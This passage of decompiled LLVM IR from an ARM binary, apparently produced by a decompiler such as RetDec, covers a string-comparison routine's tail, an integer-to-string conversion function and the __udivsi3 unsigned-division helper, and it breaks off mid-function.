  %v2_13e30 = icmp eq i8 %v2_13e2c, 0
  br i1 %v2_13e30, label %bb26, label %dec_label_pc_13e3c

bb26:                                             ; preds = %dec_label_pc_13e2c
  store i32 %v3_13e2c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13e50

dec_label_pc_13e3c:                               ; preds = %dec_label_pc_13e2c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13e40

dec_label_pc_13e40:                               ; preds = %dec_label_pc_13e40, %dec_label_pc_13e3c
  %v0_13e40 = phi i32 [ %v1_13e40, %dec_label_pc_13e40 ], [ 0, %dec_label_pc_13e3c ]
  %v1_13e40 = add i32 %v0_13e40, 1
  store i32 %v1_13e40, i32* %r2.global-to-local, align 4
  %v2_13e44 = add i32 %v1_13e40, %v0_13e2c
  %v3_13e44 = inttoptr i32 %v2_13e44 to i8*
  %v4_13e44 = load i8, i8* %v3_13e44, align 1
  %v2_13e48 = icmp eq i8 %v4_13e44, 0
  br i1 %v2_13e48, label %dec_label_pc_13e50, label %dec_label_pc_13e40

dec_label_pc_13e50:                               ; preds = %dec_label_pc_13e40, %bb26
  %v1_13e50 = phi i32 [ %v3_13e2c, %bb26 ], [ %v1_13e40, %dec_label_pc_13e40 ]
  %v2_13e50 = sub i32 %v0_13e0c, %v1_13e50
  %v4_13e50 = xor i32 %v1_13e50, %v0_13e0c
  %v5_13e50 = xor i32 %v2_13e50, %v0_13e0c
  %v6_13e50 = and i32 %v5_13e50, %v4_13e50
  %v7_13e54 = icmp sgt i32 %v0_13e0c, %v1_13e50
  br i1 %v7_13e54, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_13e50
  %v10_13e54 = sub i32 %v0_13e0c, %v9_13e54
  %v12_13e54 = xor i32 %v9_13e54, %v0_13e0c
  %v13_13e54 = xor i32 %v10_13e54, %v0_13e0c
  %v14_13e54 = and i32 %v13_13e54, %v12_13e54
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_13e50, %bb27
  %v2_13e58.in = phi i32 [ %v6_13e50, %dec_label_pc_13e50 ], [ %v14_13e54, %bb27 ]
  %v1_13e58.in = phi i32 [ %v2_13e50, %dec_label_pc_13e50 ], [ %v10_13e54, %bb27 ]
  %v1_13e50.pn = phi i32 [ %v1_13e50, %dec_label_pc_13e50 ], [ %v9_13e54, %bb27 ]
  %v0_13e58 = icmp eq i32 %v0_13e0c, %v1_13e50.pn
  %v1_13e58 = icmp slt i32 %v1_13e58.in, 0
  %v2_13e58 = icmp slt i32 %v2_13e58.in, 0
  %v3_13e58 = xor i1 %v2_13e58, %v1_13e58
  %v4_13e58 = or i1 %v0_13e58, %v3_13e58
  br i1 %v4_13e58, label %dec_label_pc_13e68.preheader, label %dec_label_pc_13e80

dec_label_pc_13e68.preheader:                     ; preds = %bb28
  %v2_13e685 = icmp eq i32 %v0_13e0c, 0
  br i1 %v2_13e685, label %dec_label_pc_13e88, label %dec_label_pc_13e70

dec_label_pc_13e60:                               ; preds = %dec_label_pc_13e70
  %v1_13e60 = add i32 %v0_13e60, 1
  %v1_13e64 = add i32 %v0_13e64, 1
  store i32 %v1_13e64, i32* %r1.global-to-local, align 4
  %v2_13e68 = icmp eq i32 %v0_13e68, 0
  br i1 %v2_13e68, label %dec_label_pc_13e88, label %dec_label_pc_13e70

dec_label_pc_13e70:                               ; preds = %dec_label_pc_13e60, %dec_label_pc_13e68.preheader
  %v0_13e68.in = phi i32 [ %v0_13e68, %dec_label_pc_13e60 ], [ %v0_13e0c, %dec_label_pc_13e68.preheader ]
  %v0_13e64 = phi i32 [ %v1_13e64, %dec_label_pc_13e60 ], [ %v0_13e2c, %dec_label_pc_13e68.preheader ]
  %v0_13e60 = phi i32 [ %v1_13e60, %dec_label_pc_13e60 ], [ %tmp, %dec_label_pc_13e68.preheader ]
  %v0_13e68 = add i32 %v0_13e68.in, -1
  %v1_13e70 = inttoptr i32 %v0_13e60 to i8*
  %v2_13e70 = load i8, i8* %v1_13e70, align 1
  %v3_13e70 = zext i8 %v2_13e70 to i32
  store i32 %v3_13e70, i32* %r2.global-to-local, align 4
  %v1_13e74 = inttoptr i32 %v0_13e64 to i8*
  %v2_13e74 = load i8, i8* %v1_13e74, align 1
  %v9_13e78 = icmp eq i8 %v2_13e70, %v2_13e74
  br i1 %v9_13e78, label %dec_label_pc_13e60, label %dec_label_pc_13e80

dec_label_pc_13e80:                               ; preds = %dec_label_pc_13e70, %bb28
  ret i32 0

dec_label_pc_13e88:                               ; preds = %dec_label_pc_13e60, %dec_label_pc_13e68.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v0_13e60, { 1, 0 }
  uselistorder i32 %v0_13e64, { 1, 0 }
  uselistorder i32 %v1_13e50, { 0, 3, 1, 2 }
  uselistorder i32 %v1_13e40, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13e0c, { 0, 6, 1, 2, 3, 7, 9, 4, 5, 8 }
  uselistorder i8 %v2_13e04, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_13e90(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13e90:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-62 = alloca i32, align 4
  %stack_var_-30 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_13e90 = load i32, i32* @r4, align 4
  store i32 %v3_13e90, i32* %stack_var_-28, align 4
  %v22_13e90 = ptrtoint i32* %stack_var_-28 to i32
  %v0_13e94 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_13e94, i32* %r8.global-to-local, align 4
  %v2_13e94 = icmp eq i32 %v0_13e94, 0
  store i1 %v2_13e94, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_13e94, label %dec_label_pc_13f84, label %dec_label_pc_13ea4

dec_label_pc_13ea4:                               ; preds = %dec_label_pc_13e90
  %v3_13ea4 = icmp eq i8 %arg1, 0
  store i1 %v3_13ea4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13ea4, label %.thread, label %dec_label_pc_13eb8

.thread:                                          ; preds = %dec_label_pc_13ea4
  %v4_13eac = inttoptr i32 %v0_13e94 to i8*
  store i8 48, i8* %v4_13eac, align 1
  %v0_13eb0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13eb0.pr.pr, label %.thread1, label %dec_label_pc_13eb8

.thread1:                                         ; preds = %.thread
  %v4_13eb0 = load i32, i32* %r8.global-to-local, align 4
  %v5_13eb0 = add i32 %v4_13eb0, 1
  %v6_13eb0 = inttoptr i32 %v5_13eb0 to i8*
  store i8 0, i8* %v6_13eb0, align 1
  %v0_13eb4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13eb4.pr.pr, label %dec_label_pc_13f84, label %dec_label_pc_13eb8

dec_label_pc_13eb8:                               ; preds = %dec_label_pc_13ea4, %.thread, %.thread1
  %tmp40 = icmp slt i8 %arg1, 0
  %v7_13ebc = icmp eq i32 %arg2, 10
  store i1 %v7_13ebc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13ebc, label %bb, label %.thread22

.thread22:                                        ; preds = %dec_label_pc_13eb8
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_13eb8
  %v4_13eb8 = zext i1 %tmp40 to i32
  store i32 %v4_13eb8, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp40, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  br i1 %phitmp, label %.thread4, label %dec_label_pc_13ee0

.thread4:                                         ; preds = %bb, %.thread22
  br label %dec_label_pc_13ef0

dec_label_pc_13ee0:                               ; preds = %bb
  %v2_13ee0 = sub nsw i32 0, %tmp
  store i1 %v3_13ea4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13ea4, label %dec_label_pc_13f90, label %dec_label_pc_13ef0

dec_label_pc_13ef0:                               ; preds = %dec_label_pc_13ee0, %.thread4
  %v0_13ef810 = phi i32 [ %tmp, %.thread4 ], [ %v2_13ee0, %dec_label_pc_13ee0 ]
  %storemerge = phi i32 [ 0, %.thread4 ], [ 1, %dec_label_pc_13ee0 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r6.global-to-local, align 4
  %v2_13ef4 = ptrtoint i32* %stack_var_-30 to i32
  store i32 %v2_13ef4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13ef8

dec_label_pc_13ef8:                               ; preds = %bb38, %dec_label_pc_13ef0
  %v2_13f18 = phi i32 [ %v5_13f18, %bb38 ], [ %v2_13ef4, %dec_label_pc_13ef0 ]
  %v0_13f14 = phi i32 [ %v2_13f1c, %bb38 ], [ %v0_13ef810, %dec_label_pc_13ef0 ]
  %v0_13efc = load i32, i32* %r5.global-to-local, align 4
  %v2_13f00 = urem i32 %v0_13f14, %v0_13efc
  store i32 %v2_13f00, i32* %r0.global-to-local, align 4
  %v7_13f04 = icmp eq i32 %v2_13f00, 9
  store i1 %v7_13f04, i1* %cpsr_z.global-to-local, align 1
  %v1_13f08 = add i32 %v2_13f00, 48
  store i32 %v0_13efc, i32* %r1.global-to-local, align 4
  %v7_13f10 = icmp sgt i32 %v2_13f00, 9
  %extract.t = trunc i32 %v1_13f08 to i8
  br i1 %v7_13f10, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_13ef8
  %v9_13f10 = add i32 %v2_13f00, 55
  %extract.t21 = trunc i32 %v9_13f10 to i8
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_13ef8, %bb37
  %v0_13f18.off0 = phi i8 [ %extract.t, %dec_label_pc_13ef8 ], [ %extract.t21, %bb37 ]
  store i32 %v0_13f14, i32* %r0.global-to-local, align 4
  %v3_13f18 = inttoptr i32 %v2_13f18 to i8*
  store i8 %v0_13f18.off0, i8* %v3_13f18, align 1
  %v4_13f18 = load i32, i32* %r7.global-to-local, align 4
  %v5_13f18 = add i32 %v4_13f18, -1
  store i32 %v5_13f18, i32* %r7.global-to-local, align 4
  %v0_13f1c = load i32, i32* %r0.global-to-local, align 4
  %v1_13f1c = load i32, i32* %r1.global-to-local, align 4
  %v2_13f1c = udiv i32 %v0_13f1c, %v1_13f1c
  store i32 %v2_13f1c, i32* %r0.global-to-local, align 4
  %v2_13f20 = icmp ugt i32 %v1_13f1c, %v0_13f1c
  store i1 %v2_13f20, i1* %cpsr_z.global-to-local, align 1
  %v0_13f24 = load i32, i32* %r6.global-to-local, align 4
  %v1_13f24 = add i32 %v0_13f24, -1
  store i32 %v1_13f24, i32* %r6.global-to-local, align 4
  br i1 %v2_13f20, label %dec_label_pc_13f2c, label %dec_label_pc_13ef8

dec_label_pc_13f2c:                               ; preds = %bb38
  %v0_13f2c = load i32, i32* %sl.global-to-local, align 4
  %v2_13f2c = icmp eq i32 %v0_13f2c, 0
  store i1 %v2_13f2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f2c, label %bb39, label %dec_label_pc_13f94

bb39:                                             ; preds = %dec_label_pc_13f2c
  store i32 %v0_13f24, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13f38

dec_label_pc_13f38:                               ; preds = %bb39, %dec_label_pc_13f94
  %v1_13f44 = phi i32 [ %v0_13f24, %bb39 ], [ %v1_13f3c.pre, %dec_label_pc_13f94 ]
  %v2_13f38 = ptrtoint i32* %stack_var_-62 to i32
  %v2_13f3c = add i32 %v1_13f44, %v2_13f38
  %v3_13f3c = inttoptr i32 %v2_13f3c to i8*
  %v4_13f3c = load i8, i8* %v3_13f3c, align 1
  %v6_13f3c = zext i8 %v4_13f3c to i32
  store i32 %v6_13f3c, i32* %r2.global-to-local, align 4
  %v2_13f40 = icmp eq i8 %v4_13f3c, 0
  store i1 %v2_13f40, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_13f3c, i32* %r1.global-to-local, align 4
  br i1 %v2_13f40, label %dec_label_pc_13f68, label %dec_label_pc_13f4c

dec_label_pc_13f4c:                               ; preds = %dec_label_pc_13f38
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13f50

dec_label_pc_13f50:                               ; preds = %dec_label_pc_13f50, %dec_label_pc_13f4c
  %v0_13f50 = phi i32 [ %v1_13f50, %dec_label_pc_13f50 ], [ 0, %dec_label_pc_13f4c ]
  %v1_13f50 = add i32 %v0_13f50, 1
  store i32 %v1_13f50, i32* %r2.global-to-local, align 4
  %v2_13f54 = add i32 %v1_13f50, %v2_13f3c
  %v3_13f54 = inttoptr i32 %v2_13f54 to i8*
  %v4_13f54 = load i8, i8* %v3_13f54, align 1
  %v2_13f58 = icmp eq i8 %v4_13f54, 0
  store i1 %v2_13f58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f58, label %dec_label_pc_13f60, label %dec_label_pc_13f50

dec_label_pc_13f60:                               ; preds = %dec_label_pc_13f50
  %v7_13f60 = icmp eq i32 %v0_13f50, -2
  store i1 %v7_13f60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13f60, label %dec_label_pc_13f84, label %dec_label_pc_13f68

dec_label_pc_13f68:                               ; preds = %dec_label_pc_13f60, %dec_label_pc_13f38
  %v0_13f7018 = phi i32 [ %v1_13f50, %dec_label_pc_13f60 ], [ %v6_13f3c, %dec_label_pc_13f38 ]
  store i32 %v2_13f3c, i32* %r0.global-to-local, align 4
  %v0_13f6c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13f6c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13f70

dec_label_pc_13f70:                               ; preds = %dec_label_pc_13f70.dec_label_pc_13f70_crit_edge, %dec_label_pc_13f68
  %v2_13f7c = phi i32 [ %v5_13f7c, %dec_label_pc_13f70.dec_label_pc_13f70_crit_edge ], [ %v0_13f6c, %dec_label_pc_13f68 ]
  %v0_13f74 = phi i32 [ %v0_13f74.pre, %dec_label_pc_13f70.dec_label_pc_13f70_crit_edge ], [ %v2_13f3c, %dec_label_pc_13f68 ]
  %v0_13f70 = phi i32 [ %v0_13f70.pre, %dec_label_pc_13f70.dec_label_pc_13f70_crit_edge ], [ %v0_13f7018, %dec_label_pc_13f68 ]
  %v1_13f70 = add i32 %v0_13f70, -1
  store i32 %v1_13f70, i32* %r2.global-to-local, align 4
  %v1_13f74 = inttoptr i32 %v0_13f74 to i8*
  %v2_13f74 = load i8, i8* %v1_13f74, align 1
  %v5_13f74 = add i32 %v0_13f74, 1
  store i32 %v5_13f74, i32* %r0.global-to-local, align 4
  %v3_13f78 = icmp eq i32 %v0_13f70, 0
  store i1 %v3_13f78, i1* %cpsr_z.global-to-local, align 1
  %v3_13f7c = inttoptr i32 %v2_13f7c to i8*
  store i8 %v2_13f74, i8* %v3_13f7c, align 1
  %v4_13f7c = load i32, i32* %r1.global-to-local, align 4
  %v5_13f7c = add i32 %v4_13f7c, 1
  store i32 %v5_13f7c, i32* %r1.global-to-local, align 4
  br i1 %v3_13f78, label %dec_label_pc_13f84, label %dec_label_pc_13f70.dec_label_pc_13f70_crit_edge

dec_label_pc_13f70.dec_label_pc_13f70_crit_edge:  ; preds = %dec_label_pc_13f70
  %v0_13f70.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_13f74.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f70

dec_label_pc_13f84:                               ; preds = %dec_label_pc_13f70, %dec_label_pc_13f60, %.thread1, %dec_label_pc_13e90
  %v0_13f84 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13f84, i32* %r0.global-to-local, align 4
  %v2_13f8c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_13f8c, i32* @r4, align 4
  ret i32 %v0_13f84

dec_label_pc_13f90:                               ; preds = %dec_label_pc_13ee0
  store i32 32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13f94

dec_label_pc_13f94:                               ; preds = %dec_label_pc_13f2c, %dec_label_pc_13f90
  %v1_13f98 = phi i32 [ %v1_13f24, %dec_label_pc_13f2c ], [ 32, %dec_label_pc_13f90 ]
  %v2_13f98 = add i32 %v1_13f98, %v22_13e90
  store i32 %v2_13f98, i32* %r2.global-to-local, align 4
  %v3_13fa0 = add i32 %v2_13f98, -34
  %v4_13fa0 = inttoptr i32 %v3_13fa0 to i8*
  store i8 45, i8* %v4_13fa0, align 1
  %v1_13f3c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13f38

; uselistorder directives
  uselistorder i32 %v5_13f7c, { 1, 0 }
  uselistorder i1 %v3_13f78, { 1, 0 }
  uselistorder i32 %v0_13f74, { 1, 0 }
  uselistorder i1 %v7_13f60, { 1, 0 }
  uselistorder i32 %v1_13f50, { 0, 1, 3, 2 }
  uselistorder i32 %v2_13f3c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_13f1c, { 1, 0 }
  uselistorder i32 %v5_13f18, { 1, 0 }
  uselistorder i32 %v2_13f00, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 1, 0 }
  uselistorder i1 %v3_13ea4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13e94, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 0, 7, 8, 2, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i8 45, { 1, 0 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder i32 48, { 4, 2, 1, 0, 3 }
  uselistorder i32 9, { 4, 79, 49, 10, 5, 50, 11, 6, 51, 7, 12, 73, 46, 14, 53, 15, 52, 13, 3, 74, 47, 2, 48, 75, 16, 77, 78, 17, 54, 55, 18, 19, 20, 56, 21, 57, 22, 58, 0, 23, 24, 25, 26, 1, 27, 28, 76, 59, 60, 8, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 80, 81, 9, 82 }
  uselistorder i32 32, { 47, 60, 61, 56, 49, 48, 4, 3, 6, 5, 8, 7, 10, 9, 55, 12, 11, 13, 14, 15, 17, 16, 18, 20, 19, 22, 21, 23, 24, 26, 25, 50, 57, 58, 27, 59, 28, 29, 30, 0, 31, 1, 2, 32, 33, 34, 35, 36, 38, 37, 51, 62, 52, 63, 53, 64, 40, 39, 42, 41, 43, 44, 45, 46, 54 }
  uselistorder i32 10, { 68, 0, 1, 9, 32, 5, 27, 34, 10, 33, 4, 61, 62, 28, 11, 63, 29, 64, 12, 66, 65, 35, 13, 14, 15, 16, 17, 18, 19, 36, 20, 37, 6, 38, 39, 2, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 21, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 7, 69, 67, 70, 3, 25, 30, 71, 23, 72, 26, 31, 8, 73, 22, 74, 24 }
  uselistorder i8 0, { 28, 29, 0, 10, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 6, 41, 42, 43, 44, 45, 46, 1, 12, 11, 13, 49, 51, 48, 22, 50, 23, 52, 53, 47, 2, 54, 55, 56, 4, 5, 3, 57, 58, 59, 15, 14, 60, 61, 64, 25, 62, 63, 24, 65, 66, 67, 68, 69, 16, 7, 17, 26, 18, 19, 70, 71, 72, 74, 75, 9, 78, 21, 84, 79, 80, 76, 77, 20, 27, 81, 82, 83, 8, 85, 86, 73, 87, 88, 89, 90, 91, 92, 93 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13f94, { 1, 0 }
  uselistorder label %dec_label_pc_13f38, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_13eb8, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_13fa8 = add i32 %arg2, -1
  %v7_13fa8 = icmp eq i32 %arg2, 1
  br i1 %v7_13fa8, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_13fac = load i32, i32* @r0, align 4
  ret i32 %v2_13fac

bb80:                                             ; preds = %entry
  %v2_13fa8 = icmp eq i32 %arg2, 0
  br i1 %v2_13fa8, label %dec_label_pc_14090, label %dec_label_pc_13fb4

dec_label_pc_13fb4:                               ; preds = %bb80
  %v0_13fb4 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_13fb4, %arg2
  br i1 %tmp, label %dec_label_pc_13fbc, label %dec_label_pc_14048

dec_label_pc_13fbc:                               ; preds = %dec_label_pc_13fb4
  %v2_13fbc = and i32 %v1_13fa8, %arg2
  %v4_13fbc = icmp eq i32 %v2_13fbc, 0
  br i1 %v4_13fbc, label %dec_label_pc_14054, label %dec_label_pc_13fc4

dec_label_pc_13fc4:                               ; preds = %dec_label_pc_13fbc
  %v3_13fc4 = icmp ult i32 %arg2, 536870912
  br i1 %v3_13fc4, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_13fc4
  %v4_13fc8 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_13fc4, %.thread
  %v0_13fe8.pr36.ph = phi i32 [ %v4_13fc8, %.thread ], [ %arg2, %dec_label_pc_13fc4 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_13fc4 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_13fe8.pr36 = phi i32 [ %v4_13fdc, %bb83 ], [ %v0_13fe8.pr36.ph, %.preheader.preheader ]
  %v1_13fe0 = phi i32 [ %v4_13fe0, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_13fd4 = icmp ugt i32 %v0_13fe8.pr36, 268435455
  br i1 %v2_13fd4, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_13fe8thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_13fd8 = icmp ult i32 %v0_13fe8.pr36, %v0_13fb4
  br i1 %v4_13fd8, label %bb82, label %dec_label_pc_13fe8thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_13fdc = and i32 %v0_13fe8.pr36, 268435456
  %v3_13fdc = icmp eq i32 %v2_13fdc, 0
  %v4_13fdc = mul i32 %v0_13fe8.pr36, 16
  br i1 %v3_13fdc, label %bb83, label %dec_label_pc_13fe8.loopexit

bb83:                                             ; preds = %bb82
  %v2_13fe0 = and i32 %v1_13fe0, 268435456
  %v3_13fe0 = icmp eq i32 %v2_13fe0, 0
  %v4_13fe0 = mul i32 %v1_13fe0, 16
  br i1 %v3_13fe0, label %.preheader, label %dec_label_pc_13fe8thread-pre-split.loopexit.loopexit

dec_label_pc_13fe8thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_13ff448.ph = phi i32 [ %v1_13fe0, %bb81 ], [ %v4_13fe0, %bb83 ]
  %v0_13fe8.pr38.ph = phi i32 [ %v0_13fe8.pr36, %bb81 ], [ %v4_13fdc, %bb83 ]
  br label %dec_label_pc_13fe8thread-pre-split.loopexit

dec_label_pc_13fe8thread-pre-split.loopexit:      ; preds = %dec_label_pc_13fe8thread-pre-split.loopexit.loopexit, %.thread2
  %v1_13ff448 = phi i32 [ %v1_13fe0, %.thread2 ], [ %v1_13ff448.ph, %dec_label_pc_13fe8thread-pre-split.loopexit.loopexit ]
  %v0_13fe8.pr38 = phi i32 [ %v0_13fe8.pr36, %.thread2 ], [ %v0_13fe8.pr38.ph, %dec_label_pc_13fe8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13fe8thread-pre-split

dec_label_pc_13fe8thread-pre-split:               ; preds = %dec_label_pc_13fe8thread-pre-split.loopexit, %bb85
  %v1_13ff446 = phi i32 [ %v1_13ff448, %dec_label_pc_13fe8thread-pre-split.loopexit ], [ %v3_13ff4, %bb85 ]
  %v0_13fe8.pr = phi i32 [ %v0_13fe8.pr38, %dec_label_pc_13fe8thread-pre-split.loopexit ], [ %v3_13ff0, %bb85 ]
  br label %dec_label_pc_13fe8

dec_label_pc_13fe8.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_13fe8

dec_label_pc_13fe8:                               ; preds = %dec_label_pc_13fe8.loopexit, %dec_label_pc_13fe8thread-pre-split
  %v1_13ff4 = phi i32 [ %v1_13ff446, %dec_label_pc_13fe8thread-pre-split ], [ %v1_13fe0, %dec_label_pc_13fe8.loopexit ]
  %v1_13ff0 = phi i32 [ %v0_13fe8.pr, %dec_label_pc_13fe8thread-pre-split ], [ %v4_13fdc, %dec_label_pc_13fe8.loopexit ]
  %v2_13fe8 = icmp slt i32 %v1_13ff0, 0
  br i1 %v2_13fe8, label %dec_label_pc_13ffc, label %bb84

bb84:                                             ; preds = %dec_label_pc_13fe8
  %v4_13fec = icmp ult i32 %v1_13ff0, %v0_13fb4
  br i1 %v4_13fec, label %bb85, label %dec_label_pc_13ffc

bb85:                                             ; preds = %bb84
  %v3_13ff0 = mul i32 %v1_13ff0, 2
  %v2_13ff4 = icmp slt i32 %v1_13ff4, 0
  %v3_13ff4 = mul i32 %v1_13ff4, 2
  br i1 %v2_13ff4, label %dec_label_pc_13ffc, label %dec_label_pc_13fe8thread-pre-split

dec_label_pc_13ffc:                               ; preds = %bb84, %dec_label_pc_13fe8, %bb85
  %v2_1400859 = phi i32 [ %v3_13ff4, %bb85 ], [ %v1_13ff4, %bb84 ], [ %v1_13ff4, %dec_label_pc_13fe8 ]
  %v1_1400051 = phi i32 [ %v3_13ff0, %bb85 ], [ %v1_13ff0, %bb84 ], [ %v1_13ff0, %dec_label_pc_13fe8 ]
  br label %dec_label_pc_14000

dec_label_pc_14000:                               ; preds = %.thread11, %dec_label_pc_13ffc
  %v1_14034 = phi i32 [ %v4_14034, %.thread11 ], [ %v2_1400859, %dec_label_pc_13ffc ]
  %v1_14008 = phi i32 [ %v0_14040, %.thread11 ], [ 0, %dec_label_pc_13ffc ]
  %v1_14038 = phi i32 [ %v4_14038, %.thread11 ], [ %v1_1400051, %dec_label_pc_13ffc ]
  %v1_14004 = phi i32 [ %v0_14030, %.thread11 ], [ %v0_13fb4, %dec_label_pc_13ffc ]
  %v3_14000 = icmp ult i32 %v1_14004, %v1_14038
  br i1 %v3_14000, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_14000
  %v3_14004 = sub i32 %v1_14004, %v1_14038
  %v3_14008 = or i32 %v1_14008, %v1_14034
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_14000, %bb86
  %v1_14010 = phi i32 [ %v1_14004, %dec_label_pc_14000 ], [ %v3_14004, %bb86 ]
  %v1_14014 = phi i32 [ %v1_14008, %dec_label_pc_14000 ], [ %v3_14008, %bb86 ]
  %v4_1400c = udiv i32 %v1_14038, 2
  %v6_1400c = icmp ult i32 %v1_14010, %v4_1400c
  br i1 %v6_1400c, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_14010 = urem i32 %v1_14038, 2
  %v4_14010 = icmp eq i32 %v3_14010, 0
  %v6_14010 = sub i32 %v1_14010, %v4_1400c
  br i1 %v4_14010, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_14014 = udiv i32 %v1_14034, 2
  %v6_14014 = or i32 %v1_14014, %v5_14014
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_1401c = phi i32 [ %v6_14010, %bb87 ], [ %v1_14010, %.thread7 ], [ %v6_14010, %bb88 ]
  %v1_14020 = phi i32 [ %v1_14014, %bb87 ], [ %v1_14014, %.thread7 ], [ %v6_14014, %bb88 ]
  %v4_14018 = udiv i32 %v1_14038, 4
  %v6_14018 = icmp ult i32 %v1_1401c, %v4_14018
  br i1 %v6_14018, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_1401c = and i32 %v1_14038, 2
  %v4_1401c = icmp eq i32 %v3_1401c, 0
  %v6_1401c = sub i32 %v1_1401c, %v4_14018
  br i1 %v4_1401c, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_14020 = udiv i32 %v1_14034, 4
  %v6_14020 = or i32 %v1_14020, %v5_14020
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_14028 = phi i32 [ %v6_1401c, %bb89 ], [ %v1_1401c, %.thread8 ], [ %v6_1401c, %bb90 ]
